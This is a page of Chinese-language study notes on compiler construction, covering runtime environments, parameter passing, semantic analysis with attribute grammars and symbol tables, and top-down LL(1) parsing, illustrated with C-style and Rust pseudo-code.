<h2 id="基于栈的运行时环境"><a class="header" href="#基于栈的运行时环境">基于栈的运行时环境</a></h2>
<p>在一个<strong>所有过程都是全局的语言</strong> (例如C语言)中，基于栈的环境有两个要求：</p>
<ol>
<li>指向当前<strong>活动记录</strong>的指针。在x86中，这个指针存在寄存器ebp上，我们一般叫他<strong>frame pointer</strong>。</li>
<li>指向先前活动记录的指针。在x86中，这个就是在栈上保存的saved ebp，所以你会看到函数的第一句汇编一般都是<code>push ebp</code>。他就是所谓的<strong>控制链control link</strong>。</li>
</ol>
<p>根据我们对C语言的了解，活动记录中有函数参数、函数的返回地址、控制链、局部变量等信息。不过在具体的架构中，寄存器也会保存很多的活动记录。例如函数参数不多的话都用寄存器传递，局部变量不多的话都用寄存器保存。</p>
<p>不过让我们稍微跳出C语言这个所有过程都是全局的语言，思考一下带有局部过程的语言（你可能想到了Python，不过下面说的并<strong>不适用于Python</strong>，Python应该算是栈和动态的混合体）。下面的语法风格是C语言，不过C语言并不支持下面的写法，我其实是把书上的Pascal程序翻译成了C语言的样子。</p>
<pre><code class="language-c">void outer() {
    int n = 1;
    void inner2() {
        n++;
    }
    void inner1(int n) {
        n--;
        inner2()
    }
    
    inner1(2);
}
int main() {
    outer();
}
</code></pre>
<p>那么在对inner的调用中，他应该如何找到变量n呢？</p>
<p>你可能想到，在调用<code>inner</code>的时候偷偷的编译器把n的地址也当做参数传进去。不过这里要介绍的处理方式更优雅，是将一个叫做<strong>访问链access link</strong>的东西添加到<strong>活动记录</strong>中。如下图。通过指向outer的访问链指针来获得outer局部变量的地址。</p>
<p><img src="Basic/Compiler/../images/image-20220511150008477.png" alt="image-20220511150008477" /></p>
<p>再进一步，在某些语言中，不仅允许有局部过程，而且还可将过程作为参数传递。还是上面那个例子，设想，如果<code>inner2</code>的地址被作为函数指针，在<code>outer</code>调用了。按照之前的模型，access link还能指向正确的<code>outer</code>的活动记录吗？更确切的说，此时的access link已经不能被编译器静态的计算出来了，因为其实编译器并不知道<code>inner2</code>什么时候会被调用。</p>
<p>C语言通过没有局部过程避免了这个问题。那如果像上面说的，又有局部过程又可以将过程作为参数传递，要怎么办呢？我们可以想想Rust是如何支持闭包的。</p>
<p>Rust通过创建了一个匿名结构体，将闭包内需要的环境变量捕获存到结构体中。这个匿名结构体当然还知道自己应该调用哪个函数。稍微修改一下上面的例子，如下。还是注意，这里只是用了C语言的语法。</p>
<pre><code class="language-c">void outer() {
    int n = 1;
    void (*f)() = inner2;
    void inner2() {
        n++;
    }
    void inner1(int n) {
        n--;
        inner2()
    }
    
    f();
}
int main() {
    outer();
}
</code></pre>
<p>那么，编译器在执行第三行<code>void(*f)() = inner2</code>的时候，其实应该要做下面的事情：</p>
<pre><code class="language-c">struct {
    void (*fp) ();
    int n;
} __inner2;
f = __inner2 {
    fp: inner2;
    n: 1;
}
</code></pre>
<p>当然，调用函数的时候也应该要做相应的改变。</p>
<h2 id="完全动态的运行时环境"><a class="header" href="#完全动态的运行时环境">完全动态的运行时环境</a></h2>
<p>这依赖于堆。堆可以像C/C++那样手动管理，也可以像C++/Rust一样半自动管理（利用RAII机制、使用智能指针），也可以借助垃圾回收器(GC)自动管理。最基本的垃圾回收机制是</p>
<ul>
<li>标识和打扫（mark and swap）</li>
<li>标记和压缩（mark and compact）</li>
<li>标记和复制（mark and copy）</li>
</ul>
<h2 id="参数传递机制"><a class="header" href="#参数传递机制">参数传递机制</a></h2>
<p>我们讨论在调用函数时传递参数的方式。后面会举一个具体的例子便于理解。</p>
<h3 id="pass-by-value"><a class="header" href="#pass-by-value">Pass by Value</a></h3>
<p>就是 C 语言中的参数传递方式。需要注意的是，C 语言中即使我们通过传入指针变量实现一些操作，其本质上还是将实参中指针变量的值（即所指地址）复制到形参的相应变量中去。</p>
<h3 id="pass-by-reference"><a class="header" href="#pass-by-reference">Pass by Reference</a></h3>
<p>传递变量的引用，即传递其在存储空间中的位置。在函数中所做的一切更改都会作用于这个变量本身。</p>
<p>比如在C++中的传递引用参数。Python，Java也可以理解为引用传递，不过Python中是存在不可变对象的，你无法对不可变对象做出更改，这又是另一个故事了。</p>
<h3 id="pass-by-value-result"><a class="header" href="#pass-by-value-result">Pass by Value-Result</a></h3>
<p>将实参从左到右逐个复制到形参中，在函数运行结束后再逐个将其复制回原来的位置。</p>
<p><strong>我觉得</strong>他很蛋疼，没什么用。我可以想到的唯一好处可能是对并发比较友好。但是我觉得函数式的不可变更好。Ada使用了这个机制，但是我对这个语言不了解。</p>
<h3 id="pass-by-name"><a class="header" href="#pass-by-name">Pass by Name</a></h3>
<p>名字传递的思想是：直到函数真正使用了某个参数时才对其赋值，因此也称为 <strong>延迟赋值 (delayed evaluation)</strong>。等价的做法是将函数在调用的原位进行展开。</p>
<p>我不知道有哪个语言是真的按照名字传递的，不过等价的做法被<strong>函数式语言</strong>所支持。下面的例子是Rust，优势是可以将一些计算延迟。Rust的<a href="https://doc.rust-lang.org/std/option/enum.Option.html#method.unwrap_or_else"><code>Option::unwrap_or_else</code></a>可以体现出他的优势，如果你不懂Rust请忽略。</p>
<pre><pre class="playground"><code class="language-rust">fn delay&lt;F&gt;(a: F) -&gt; i32
where
    F: FnOnce() -&gt; i32,
{
    a() + 1
}

#[test]
fn main() {
    println!(&quot;{}&quot;, delay(|| 1))
}
</code></pre></pre>
<div style="break-before: page; page-break-before: always;"></div><h1 id="sematic-analyzing"><a class="header" href="#sematic-analyzing">Sematic Analyzing</a></h1>
<p>https://www.yuque.com/xianyuxuan/coding/cp_4</p>
<p>在一个典型的静态类型的语言 (如C语言)中，语义分析包括构造符号表、记录声明中建立的名字的含义、在表达式和语句中进行类型推断和类型检查以及在语言的类型规则作用域内判断它们的正确性。</p>
<p>这里提到的语义分析是 <strong>静态语义分析</strong>，不包含可能的逻辑错误，如死循环、除以 0 等情况。</p>
<p>例如，标识符的属性就包括其种属（变量、数组、函数名等等）、数据类型、存储位置、长度、值、作用域等。</p>
<p>属性的确定时间是有多种可能的。属性值的计算以及将计算出来的值与相关的语言结构进行联系的过程称为属性的 <strong>绑定binding</strong>，发生的时间称为 <strong>binding time</strong>。在程序执行前（编译过程中）进行 binding 的属性称为 <strong>static attributes</strong>；在程序执行过程中才进行 binding 的属性称为 <strong>dynamic attributes</strong>。在编译过程中进行语义分析的时间也是有多种可能的，我们可以在语法分析生成完AST之后再进行语义分析，这就是遍历一遍语法树；也可以将语法分析和语义分析结合在一起。</p>
<h2 id="属性计算"><a class="header" href="#属性计算">属性计算</a></h2>
<p>我们通过为CFG中的<strong>文法符号</strong>设置<strong>语义属性</strong>（简称属性），来表示语法成分对应的语义信息。属性可以是任何类型的，比如numbers, types, table references, or strings。文法符号的语义属性值是用与文法符号所在产生式（语法规则）相关联的**语义规则(semantic rule)**来计算的。比如下面这个产生式。我们就可以给文法符号<code>digit</code>的<code>value</code>属性赋值成0。<code>digit.value = 0</code>。</p>
<pre><code>digit -&gt; 0
</code></pre>
<p><strong>语法制导定义(Syntax-Directed Definitions, SDD)<strong>是对CFG的推广，也叫</strong>属性文法(Attribute Grammar)</strong>（不过他们还是有区别的，属性文法要求没有副作用）</p>
<ul>
<li>将每个<strong>文法符号</strong>和一个<strong>语义属性集合</strong>相关联。</li>
<li>将每个<strong>产生式</strong>和一个<strong>语义规则集合</strong>相关联，这些规则用于计算该产生式中各文法符号的属性值。</li>
</ul>
<p><img src="Basic/Compiler/../images/image-20220424105807459.png" alt="SDD例子" /></p>
<p>**语法制导翻译方案(Syntax-Directed Translation Scheme, SDT)**是在产生式右部嵌入了程序片段的CFG，这些程序片段称为语义动作。按照惯例，语义动作放在花括号内。</p>
<p><img src="Basic/Compiler/../images/image-20220424105821323.png" alt="SDT例子" /></p>
<h3 id="综合属性和继承属性"><a class="header" href="#综合属性和继承属性">综合属性和继承属性</a></h3>
<p>属性根据不同的计算方式，分成两种：</p>
<ul>
<li>A <strong>synthesized attribute(综合属性)</strong> for a nonterminal A at a parse-tree node N is defined by a semantic rule associated with the production at N. Note that the production must have A as its head. A synthesized attribute at node N is defined only in terms of <strong>attribute values at the children of N and at N itself</strong>. 另外，终结符从词法分析器处获得的属性值被归为综合属性值</li>
<li>An <strong>inherited attribute(继承属性)</strong> for a nonterminal B at a parse-tree node N is defined by a semantic rule associated with the production at the parent of N. Note that the production must have B as a symbol in its body. An inherited attribute at node N is defined only in terms of <strong>attribute values at N's parent, N itself, and N's siblings</strong>. </li>
<li><strong>给定一个属性文法，通过适当地修改文法，而无须改变文法的语言，所有的继承属性可以改变成综合属性</strong>。</li>
</ul>
<p><img src="Basic/Compiler/../images/image-20220419135151718.png" alt="image-20220419135151718" /></p>
<p>从上面两种计算方式不难看出，AST上节点的属性计算依赖于其他节点。我们可以把这种依赖关系表达为有向图的形式，称为<strong>依赖图</strong>。依赖图的节点是语法分析树的节点，有向边是从被依赖节点指向节点。在依赖图中，综合属性表现为边只从子节点指向父节点。</p>
<p><img src="Basic/Compiler/../images/image-20220620164803215.png" alt="image-20220620164803215" /></p>
<p>我们的依赖图是不应该出现环的，因为环意味着循环依赖，依赖图应该是有向无环图我们才好正确的计算每个节点的属性。<strong>对于一个无环图，我们可以按照拓扑排序的顺序进行属性求值</strong>。</p>
<h2 id="s-sdd和l-sdd"><a class="header" href="#s-sdd和l-sdd">S-SDD和L-SDD</a></h2>
<p>虽然我们可以按照拓扑排序的方式去寻找一个合理的求值顺序（或判断是否存在合理的求值顺序），不过在实际运用上，我们有两个实用的无环图的子类：</p>
<ul>
<li>
<p>S-属性定义(S-SDD)。仅仅使用综合属性的SDD。他可以在bottom-up parsing的时候计算，或者在top-down parsing的时候采用post-order的方式遍历进行计算。</p>
</li>
<li>
<p>L-属性定义(L-SDD)。直观含义是在一个产生式所关联的各属性之间，依赖图的边可以从左到右，但不能从右到左。严格的说，一个SDD是L-SDD，当且仅当它的每个属性要么是一个综合属性，要么是满足如下条件的继承属性：假设存在一个产生式$A→X_1X_2…X_n$，其右部符号$X_i(1 \le i \le n)$的继承属性仅依赖于下列属性：</p>
<ol>
<li>$A$的继承属性</li>
<li>产生式中$X_i$左边的符号 $X_1, X_2, … , X_{i-1}$ 的属性</li>
<li>$X_i$本身的属性，但$X_i$的全部属性不能在依赖图中形成环路</li>
</ol>
<p>所以S-SDD是L-SDD的一种特殊情况。</p>
</li>
</ul>
<p>S-SDD在依赖图中，表现为总是通过子结点的属性值来计算父结点的属性值。<strong>可以和自顶向下、自底向上的语法分析过程一起计算</strong>。并且<strong>如果一个S-SDD的基本文法可以使用LR分析技术，那么它的SDT可以在LR语法分析过程中实现</strong>。</p>
<ul>
<li>自底向上：在构造分析树的结点的同时计算相关的属性（此时其子结点的属性必然已经计算完毕）</li>
<li>自顶向下：递归子程序法中，在过程A()的最后计算A的属性（此时A调用的其他过程（对应于子结构）已经调用完毕）</li>
</ul>
<pre><pre class="playground"><code class="language-rust"><span class="boring">#![allow(unused)]
</span><span class="boring">fn main() {
</span>// 自底向上伪代码实例
enum Action {
    Shift, 
    Reduce(u32), 
    Error(&amp;'static str),
    Accept
}
// 我们假设所有Token的属性都已经计算好了
fn parse(input: &amp;[Token]) {
    let mut state = 0;       
    let mut stack = vec![];  
    let mut input = input.iter();
    loop {
        let token = input.next().unwrap();
        match ACTION(state, token) {
        	Action::Reduce(pr) =&gt; {
                let (A, beta) = PRODUCTION[pr]; 
                for _ in 0..beta.len() {        
                    let token = stack.pop().unwrap();  // AST上节点的所有子节点都被遍历
                    A.compute(&amp;token);                 // 把子节点的属性拿进去计算
                }
                stack.push(A);
                state = GOTO[state][A];
                ...
            },
        	Action::Shift =&gt; {
                stack.push(token); 
            },
            Action::Accept =&gt; break,
        	Action::Error(e) =&gt; panic!(&quot;Error: {}&quot;,e),
    	}
    }
}
<span class="boring">}
</span></code></pre></pre>
<p>L-SDD稍微复杂一点，将L-SDD转换为SDT，需要：</p>
<ol>
<li>将计算某个非终结符号A的<strong>继承属性</strong>的动作插入到产生式右部中<strong>紧靠在A的本次出现之前的位置上</strong>。</li>
<li>将计算一个产生式左部符号的<strong>综合属性</strong>的动作放置在这个产生式右部的<strong>最右端</strong>。</li>
</ol>
<p>所以我们怎么实现他呢？<strong>如果一个L-SDD的基本文法可以使用LL分析技术，那么它的SDT可以在LL或LR语法分析过程中实现</strong>。</p>
<ul>
<li>在自顶向下中实现L-SDD，对于每个非终结符号A，其对应的过程的参数为继承属性，返回值为综合属性</li>
<li>在自底向上中实现L-SDD，对于每个非终结符号A，计算他的合成属性时，可以直接利用还存在在栈上的数据的属性，在计算他的继承属性的时候，往往只能存在一个外部数据结构上。</li>
</ul>
<p>有时，我们不好将属性作为函数的参数和返回值进行传递，这时，我们可以</p>
<ol>
<li>将属性保存在syntax tree上。</li>
<li>将属性保存在external data structure中，比如符号表。</li>
</ol>
<h2 id="符号表"><a class="header" href="#符号表">符号表</a></h2>
<p>在编译器中<strong>符号表</strong>是一个典型的目录数据结构。插入、查找和删除这3种基本操作。典型实现包括线性表、各种搜索树结构 (二叉搜索树、AVL树、B树)以及Hash表等。</p>
<p>通常使用Hash表并采用<a href="Basic/Compiler/../DataStructure/Hashing.html#%E5%88%86%E7%A6%BB%E9%93%BE%E6%8E%A5%E6%B3%95-separate-chaining">separate chaining</a>的方式解决冲突，因为他的插入、删除和查找的时间代价都差不多并且比较低。如下图所示</p>
<p><img src="Basic/Compiler/../images/image-20220525184513476.png" alt="image-20220525184513476" /></p>
<p>有一系列可能的方法可以实现嵌套的作用域</p>
<ol>
<li>
<p>为每个作用域建立一个新的符号表，再从内到外把它们链接在一起，这样如果查找操作在当前表中没有找到名字，就自动用附上的表继续搜索。这样的话，退出作用域会非常方便，只需要清理掉新创建的符号表就行了。</p>
<p><img src="Basic/Compiler/../images/image-20220525185606055.png" alt="image-20220525185606055" /></p>
</li>
<li>
<p>符号表插入操作不必改写前面的说明，不过查找操作只能找到名字最近插入的说明；类似地，删除操作不应删除与这个名字相应的所有说明，只需删除最近的一个。</p>
<p><img src="Basic/Compiler/../images/image-20220525190153038.png" alt="image-20220525190153038" /></p>
</li>
</ol>
<h2 id="类型检查"><a class="header" href="#类型检查">类型检查</a></h2>
<p>类型检查，如果两边的类型不匹配可能会发生隐式转换（弱类型），也可能报错（强类型）。</p>
<p>首先，我们需要<strong>基本类型Basic Types</strong>，比如C语言里的<code>int</code>和<code>double</code>。那么<strong>类型构造器Type Constructor</strong>就是一个函数，他以类型为输入，输出另一个类型。C语言中的类型构造器有下面几种：</p>
<ul>
<li>
<p>数组/指针（C语言里是一样的）：比如<code>int *a</code>，<code>a</code>的类型是<code>int *</code>，<code>a[1]</code>的类型是<code>int</code>。</p>
<p><code>TC(int *) = int</code></p>
</li>
<li>
<p>结构体：比如<code>struct {double d; int i;} S</code>构成了一个新的类型。</p>
<p><code>TC(double, int) = struct S</code></p>
</li>
<li>
<p>联合：比如<code>union {double d; int i;} U</code>构成了一个新的类型。</p>
<p><code>TC(double, int) = union U</code></p>
</li>
<li>
<p>函数：比如<code>int f(double d, int i);</code>构成了一个新的类型。</p>
<p><code>TC(int, double, int) = int(*f)(double, int)</code></p>
</li>
</ul>
<p>我们什么时候认为两种类型是等价的？由弱到强</p>
<ul>
<li>structure equivalence: two types are the same if and only if they have the same structure.</li>
<li>declaration equivalence: weaker version of name equivalence( <code>t2 = t1</code>  are interpreted as establishing type aliases, rather than new types).</li>
<li>name equivalence: two type expressions are equivalent if and only if they are either the same simple type or are the same type name</li>
</ul>
<p>比如，我们定义两个类型，以下为Rust代码</p>
<pre><pre class="playground"><code class="language-rust"><span class="boring">#![allow(unused)]
</span><span class="boring">fn main() {
</span>struct Meter(u32);
struct KiloMeter(u32);
type Mi = Miter;
<span class="boring">}
</span></code></pre></pre>
<ul>
<li>如果我们认为<code>Meter</code>和<code>KiloMeter</code>有一样的类型，那么就是structure equivalence。</li>
<li>如果不认为<code>Meter</code>和<code>KiloMeter</code>有一样的类型，而且不认为<code>Meter</code>和<code>Mi</code>有同一类型，那么就是name equivalence。</li>
<li>如果不认为<code>Meter</code>和<code>KiloMeter</code>有一样的类型，不过认为<code>Meter</code>和<code>Mi</code>有同一类型，那么就是declaration equivalence。</li>
</ul>
<p>这么看来，Rust应该是declaration equivalence。</p>
<div style="break-before: page; page-break-before: always;"></div><h1 id="syntax-analyzer"><a class="header" href="#syntax-analyzer">Syntax Analyzer</a></h1>
<p>在我们的编译器模型中，语法分析器从词法分析器获得一个Token Stream。语法分析器的工作是根据Token Stream构造出一个语法分析树，将它传递给编译器的其他部分进一步处理。语法分析器大致分为通用的、自顶向下的和自底向上的，而通用的因为效率太低不被使用，下面会介绍后二者，<strong>自顶向下分析</strong>和<strong>自底向上分析</strong>。</p>
<h2 id="context-free-grammar"><a class="header" href="#context-free-grammar">Context Free Grammar</a></h2>
<p>首先了解<strong>文法Grammar</strong>的概念。文法是形式语言中字符串的一套产生式规则。这些规则描述了如何用语言的字母表生成符合语法的有效的字符串。文法不描述字符串的含义，也不描述在任何上下文中可以用它们做什么——只描述它们的形式。</p>
<p><strong>Grammar</strong>: <code>G=(Vt,Vn,P,S)</code>。意思是说，一个Grammar由下面四个元素组成：</p>
<ol>
<li>一个<strong>终结符号(terminal symbol)<strong>集合，有时也叫</strong>词法单元(token)</strong>。</li>
<li>一个**非终结符号(nonterminal symbol)**集合，又是也叫语法变量。每个非终结符号表示一个终结符号串的集合。</li>
<li>一个产生式(production)集合。</li>
<li>指定一个非终结符号位<strong>开始符号(start symbol)</strong>。开始符号表示的是该Grammar中最大的语法成分。</li>
</ol>
<p>例如：<code>stmt -&gt; if (expr) stmt else stmt</code>这样的规则叫做<strong>production</strong>，<code>if</code>和<code>()</code>被称为<strong>terminal symbol</strong>，<code>expr</code>和<code>stmt</code>这样的变量表示终结符号的序列，称为<strong>nonterminal symbol</strong>。<code>stmt</code>就是<strong>start symbol</strong>。</p>
<p><strong>上下文无关文法 Context Free Grammar</strong>指的是<strong>产生式左侧只能包含一个符号，并且该符号为非终结符号的文法</strong>。这个限制是非常重要的。</p>
<blockquote>
<p>事实上一共有四种文法，逐级限制。对于α→β：</p>
<ul>
<li>0型文法：α中至少包含1个非终结符</li>
<li>1型文法（CSG 上下文有关） ：｜α｜≤｜β｜</li>
<li>2型文法（CFG 上下文无关文法） ：α ∈ 非终结符</li>
<li>3型文法（RG 正则）：A→wB 或 A→w (A→Bw 或A→w) A/B代表非终结符</li>
</ul>
<p>程序设计语言的语法通常是<strong>CFG</strong>，通常用<strong>RG</strong>匹配Token。</p>
</blockquote>
<p>还有一些非常重要的概念需要了解：</p>
<ul>
<li>
<p><strong>推导Derivation</strong>: 简单的说，就是把production的右部替换成左部，只替换1次就是directly derive。记做$\Rightarrow^0$，若干次替换记做$\Rightarrow^*$。相反的过程就是<strong>归约Reduction</strong>。parsing tree是推导的图形化表示。</p>
</li>
<li>
<p>Language: 由grammar <code>G</code>的start symbol <code>S</code>推导出的所有sentence构成的集合称为grammar<code>G</code>生成的language，记为<code>L(G)</code>。<code>L(G) = {w /S =&gt;*, w ∈ Vt*}</code>。要证明一个Language和Grammar对应，需要证明Grammar所有能产生的sentence都属于Language，Language中所有的string都能被Grammar产生。</p>
</li>
<li>
<p><strong>Ambiguous(二义性)</strong>: 若grammar对同一sentence可以产生不止一棵parsing tree，则称G是ambiguous。要改写二义性文法为非二义性文法</p>
<ul>
<li>划分优先级和结合性</li>
<li>引入一个新的非终结符，<strong>增加一个子结构并提高一级优先级</strong>（优先级的判断）</li>
<li><strong>递归非终结符在终结符左边，运算具有左结合性，否则具有右结合性</strong>。</li>
</ul>
</li>
</ul>
<p>回顾一下，Syntax Analyzer的作用是生成AST或Parsing Tree。其实parsing tree是推导的图形化表示。AST则是精简的Parsing Tree，一般我们生产AST。</p>
<p>现在我们手头有一个Token Stream。那么我们如何进行推导呢去构建parse tree呢？主要有两个问题：<strong>换哪个nonterminal symbol? 用哪条production?</strong>。常用的有两种办法：</p>
<ol>
<li>在<strong>Left-most Derivation</strong>最左推导中，总是选择每个句型的最左nonterminal symbol进行替换。这个和<strong>top-down parsing</strong>一起使用，也就是从Parse Tree的顶向下分析。**左句型(left sentential form)**是指推导至该句子的全部左推导。</li>
<li>在<strong>Right-most Derivation</strong>最右推导中，总是选择每个句型的最右nonterminal symbol进行替换，最右推导也被称为<strong>规范推导</strong>。这个和<strong>down-top parsing</strong>一起使用，也就是从Token Stream向上构造Parse Tree。**右句型(right sentential form)**是指推导至该句子的全部右推导。</li>
</ol>
<h2 id="top-down-parsing"><a class="header" href="#top-down-parsing">top-down parsing</a></h2>
<p>在<strong>top-down parsing</strong>中，总是采用<strong>Left-most Derivation</strong>。自顶向下语法分析可以被看做寻找输入串的<strong>最左推导</strong>(若符号串α中有两个以上的非终结符号，则对推导的每一步坚持把α中的最左非终结符号进行替换，称为最左推导)的过程。</p>
<p>具体怎么做，使用的是<strong>Recursive-Descent Parsing(递归下降分析)</strong>，这是自顶向下分析的通用形式。他由一组过程组成，每个过程对应一个nonterminal symbol。Rust例程如下。</p>
<pre><pre class="playground"><code class="language-rust"><span class="boring">#![allow(unused)]
</span><span class="boring">fn main() {
</span>enum Symbol{
    Terminal(TerminalSymbol),
    Nonterminal(NonterminalSymbol),
}
enum TerminalSymbol {
    ...
};
struct NonterminalSymbol {
    productions: Vec&lt;Vec&lt;Symbol&gt;&gt;&gt;,
}

impl NonterminalSymbol {
	fn parse(&amp;self,mut tokenstream: &amp;[TerminalSymbol]) {
    	for production in self.productions {
            for symbol in production {
                match symbol {
                    Terminal(ts) =&gt; {
                        if ts == tokenstream[0] {
                            tokenstream = &amp;tokenstream[1..];
                        } else {
               				// 如果所有的production中，只有1个在匹配到第k个symbol不会return，
                            // 其实也可以通过向前看k个symbol来实现确定的递归，不需要回溯。
                            // 这就是所谓的预测分析技术。
                            // 即使有多个可能匹配的也可以向前看若干个symbol进行剪枝，不过我就懒得写了
                            return;
                        }
                    }
                    Nonterminal(ns) =&gt; {
                        // 是需要递归的
                        ns.parse(tokenstream);
                    }
                }
            }
        }
	}    
}
<span class="boring">}
</span></code></pre></pre>
<h3 id="消除左递归"><a class="header" href="#消除左递归">消除左递归</a></h3>
<p><strong>自顶向下语法分析不能处理左递归（left recursion）的文法</strong>：如果存在如<code>A=&gt;Ax</code>这样的production，或者可以间接推导出这样的production，那么递归下降就会出现死递归。不过左递归是可以消除的。消除左递归算法</p>
<ul>
<li>
<p>消除产生式中的<strong>直接左递归</strong>是比较容易的。例如假设非终结符P的规则为</p>
<p><code>P -&gt; Pα | β</code></p>
<p>其中，β是不以P开头的符号串。那么，我们可以把P的规则改写为如下的非直接左递归形式：</p>
<p><code>P -&gt; βP’</code> ,<code>P’-&gt; αP’ | ε</code></p>
</li>
<li>
<p>消除<strong>间接左递归</strong>，可以先把所有的左递归转化成直接左递归消除。</p>
</li>
<li>
<p>综上，消除左递归的算法：</p>
<pre><pre class="playground"><code class="language-rust"><span class="boring">#![allow(unused)]
</span><span class="boring">fn main() {
</span>for i in 0..n {
    for j in 0..i {
        if 有 A[i] -&gt; A[j]β 这样的式子
			for 所有的A[i] -&gt; a[1]|a[2]...|a[k]
        		改写成 A[i] -&gt; a[1]β | a[2]β | ... | a[k]β;
    }
    移除 A[i]本身的左递归;
}
<span class="boring">}
</span></code></pre></pre>
</li>
</ul>
<h3 id="提取左公因子"><a class="header" href="#提取左公因子">提取左公因子</a></h3>
<p><strong>提取左公因子</strong>是一种文法转换方法。他可以产生适用于预测分析分析技术的文法。比如下面的例子，当不清楚如何在<code>S</code>的两个产生式中选择的时候，我们可以通过改写产生式来推后这个决定。例如：</p>
<pre><code>S -&gt; acd | abe   遇到a咋办，选哪个？
-----------------改写
S  -&gt; aS'
S' -&gt; cd | be
</code></pre>
<h3 id="ll1"><a class="header" href="#ll1">LL(1)</a></h3>
<p><strong>LL(1)文法</strong>，表示从左向右的扫描输入，产生最左推导，<strong>每一步向前看一个输入符号来确定语法分析动作</strong>，就不用回溯了。显然，LL(1)文法不可能是左递归的，也不可能是有二义性的。他等价于下面的约束：</p>
<p>对于G的任意两个产生式<code>A -&gt; alpha | beta</code></p>
<ol>
<li><code>alpha</code>和<code>beta</code>不能都推导出以token <code>a</code> 开头的串。</li>
<li><code>alpha</code>和<code>beta</code>最多只有一个能推导出空串。</li>
</ol>
<p><strong>分析表的构造过程</strong>：构造FIRST集-&gt;构造FOLLOW集-&gt;构造SELECT集-&gt;构造分析表 :star2:</p>
<ul>
<li><code>FIRST(α)</code>：给定一个符号串<code>α</code>，<code>α</code>的串首终结符集<code>FIRST(α)</code>被定义为可以从<code>α</code>推导出的<strong>所有串</strong> <strong>首终结符</strong>构成的集合。如果<code>α =&gt;* ε</code>，那么<code>ε</code>也在<code>FIRST(α)</code>中。</li>
<li><code>FOLLOW(A)</code>：可能在某个句型中<strong>紧跟在A后面的终结符a的集合</strong>。<code>FOLLOW(A)={a| S =&gt;* αAaβ, a∈Vt, α,β∈(Vt∪Vn)*}</code>。另外，如果A是某个句型的最右符号，则将结束符<code>$</code>加入<code>FOLLOW(A)</code>。</li>
<li><code>SELECT(A -&gt; α)</code>，production <code>A -&gt; α</code>的<strong>可选集</strong>是指可以选用该production进行derive的输入符号的集合，记做<code>SELECT(A -&gt; α)</code>。
<ul>
<li>如果 <code>ε∉FIRST(α)</code>, 那么<code>SELECT(A -&gt; α) = FIRST(α)</code></li>
<li>如果 <code>ε∈FIRST(α)</code>，那么<code>SELECT(A -&gt; α) =  (FIRST(α) - {ε}) ∪ FOLLOW(A)</code>。</li>
</ul>
</li>
<li>可以由这三个概念定义<strong>LL(1)文法</strong>。<strong>就是文法G的任意两个具有相同左部的production <code>A-&gt; α | β</code>，满足<code>SELECT(A -&gt; α)</code>和<code>SELECT(A -&gt; β)</code>不相交</strong>。根据SELECT集，我们可以构造parsing table。</li>
</ul>
<p>下面是一个例子：</p>
<p><img src="Basic/Compiler/../images/image-20220321131438918.png" alt="image-20220321131438918" /></p>
<pre><code>E  -&gt; TE'
E' -&gt; +TE' | ε
T  -&gt; FT'
T' -&gt; *FT' | ε
F  -&gt; (E) | id
-------------------------
FIRST(E ) = {(, id}
FIRST(E') = {+, ε}
FIRST(T ) = {(, id}
FIRST(T') = {*, ε}
FIRST(F ) = {(, id}

- 如果X是一个终结符，那么FIRST ( X ) = { X } 
- 如果X是一个非终结符，且 X-&gt;Y1Y2...Yk∈P (k≥1) 
                  FISRT(X) = FIRST(Y1)
  如果ε在Y1中，     FISRT(X) = FIRST(Y1)+FIRST(Y2)
  如果ε在Y1,Y2中，  FISRT(X) = FIRST(Y1)+FIRST(Y2)+FIRST(Y3)
  ...
- 如果 X-&gt;ε∈P，那么将ε加入到FIRST( X )中
--------------------------
FOLLOW(E ) = {$, )}
FOLLOW(E') = {$, )}
FOLLOW(T ) = {+, $, )}
FOLLOW(T') = {+, $, )}
FOLLOW(F ) = {*, +, $, )}

不断应用下列规则，直到没有新的终结符可以被加入到任何FOLLOW集合中为止
1. 将$放入FOLLOW( S )中，其中S是开始符号，$是输入右端的结束标记
2. 如果存在一个产生式A-&gt;αBβ，那么FIRST(β)中除ε之外的所有符号都在FOLLOW(B)中 
3. 如果存在一个产生式A-&gt;αB，或存在产生式A→αBβ且FIRST(β)包含ε，那么FOLLOW(A)中的所有符号都在FOLLOW(B)中
---------------------------
SELECT
</code></pre>
<p><strong>下推自动机</strong>，可以理解为一个有栈的有穷自动机。用下推自动机解析LL(1)文法，就不需要递归了。Rust例程如下，但是这里的错误处理都panic了，没有处理。更科学一点的做法是给出错误原因。用文字描述是：</p>
<ol>
<li>先将开始符号入栈</li>
<li>每次弹出栈顶元素
<ul>
<li>如果是非终结符，那么我们查表，将对应的产生式入栈（Generate）。如果表为空则报错（Error）。</li>
<li>如果是终结符，那么进行匹配（Match）。如果不匹配则报错（Error）。</li>
</ul>
</li>
<li>直到栈为空，如果此时输入流正好匹配完，则匹配成功。（Accept）</li>
</ol>
<pre><pre class="playground"><code class="language-rust"><span class="boring">#![allow(unused)]
</span><span class="boring">fn main() {
</span>use std::collections::{HashMap, VecDeque};

#[derive(PartialEq, Eq, Hash)]
pub enum Term {
    Token(String),
    Empty,
    End,
}
#[derive(PartialEq, Eq, Hash)]
pub struct NonTerm&lt;'a&gt; {
    productions: Vec&lt;Vec&lt;Symbol&lt;'a&gt;&gt;&gt;,
}

#[derive(PartialEq, Eq, Hash)]
pub enum Symbol&lt;'a&gt; {
    NonTerm(&amp;'a NonTerm&lt;'a&gt;),
    Term(&amp;'a Term),
}
// input: 输入缓冲区
// start: 开始符号
// table: 预测分析表
pub fn parse(
    mut input: &amp;[Term],
    start: &amp;Symbol,
    table: &amp;HashMap&lt;NonTerm, HashMap&lt;Term, Vec&lt;Symbol&gt;&gt;&gt;,
) {
    let mut stack = VecDeque::new();
    stack.push_front(start);
    while !stack.is_empty() {
        let s = stack.pop_front().unwrap(); // 弹出栈顶符号
        let i = &amp;input[0]; // Token流第一个符号
        match s {
            Symbol::NonTerm(nonterm) =&gt; {
                if let Some(production) = table.get(&amp;nonterm).unwrap().get(&amp;i) {
                    for sym in production.iter().rev() {
                        stack.push_front(&amp;sym);
                    }
                } else {
                    panic!()
                }
            }
            Symbol::Term(token) =&gt; {
                if *token == i {
                	input = &amp;input[1..];
                } else {
                    panic!()
            	}
            },
        }
    }
}
<span class="boring">}
</span></code></pre></pre>
<h2 id="bottom-up-parsing"><a class="header" href="#bottom-up-parsing">bottom-up parsing</a></h2>
<p>在bottom-up parsing中，总是采用的是<strong>Leftmost-reduction</strong>的方式，也就是反向构造的<strong>Rightmost-derivation</strong>。自底向上的语法分析过程，可以看作是<strong>将一个串w归约为文法开始符号的过程</strong>。</p>
